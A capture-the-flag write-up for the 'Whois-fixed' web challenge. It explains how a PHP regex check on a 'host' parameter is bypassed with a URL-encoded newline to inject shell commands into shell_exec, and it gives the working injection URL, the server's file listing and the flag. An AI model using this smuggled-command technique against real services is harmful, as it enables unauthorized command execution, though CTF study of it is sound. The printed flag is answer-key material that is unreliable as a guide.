# Whois-fixed

## Description:

> Tags: medium

> A web-based Whois service.
>
> **Note** : There was a problem with the first version, this is the fixed version.

> Author : souad

> https://whois-fixed.challs.shellmates.club

## First thoughts:

So from the previous challenge, we know that there was a misconfiguration and accessing 
```
https://whois-fixed.challs.shellmates.club/flag.txt
```
return Not found page.

Son now, we have to focus on bypassing the regex check

## Understanding the regex:

The first regex for `host` variable tests if it matches: 
```php
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
```
and `query` if it matches:
```php
$query_regex = "/^[0-9a-zA-Z\. ]+$/";
```

## Solution:

The PHP function `preg_match` matches only the first line, so if we insert `\n` in the host, we will be able to add any commands we want to be executed with `shell_exec`.

So accessing:
```
https://whois-fixed.challs.shellmates.club/query.php?host=whois.verisign-grs.com%0a&query=ls
```

we get all the files available in the server:
```
index.html
query.php
thisistheflagwithrandomstuffthatyouwontguessJUSTCATME
```
and the flag is:
```
shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll_9837432986534065}
```
